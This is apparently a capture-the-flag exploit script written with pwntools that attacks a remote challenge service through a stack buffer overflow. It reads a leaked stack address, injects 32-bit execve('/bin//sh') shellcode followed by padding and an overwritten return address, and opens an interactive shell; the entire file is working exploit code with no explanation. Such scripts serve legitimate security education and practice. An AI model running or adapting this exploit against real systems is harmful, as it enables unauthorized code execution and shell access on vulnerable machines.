from pwn import *

LOCAL = False

if LOCAL:
    p = process("./program")
    pause()
else:
    p = remote("ctf-sp.dcc.fc.up.pt", 4001)

res = p.recvuntil(b"input:")

endereco = re.search('0x(.+?).\n', res.decode('utf-8')).group(1)
endereco_hex = bytearray.fromhex(endereco)
endereco_hex.reverse()

code = bytearray.fromhex("31c050682f2f7368682f62696e89e3505389e1b00bcd80")
pointer = bytearray.fromhex("1234567891234567")

p.sendline(code + b"a"*77 + pointer + endereco_hex)
p.interactive()
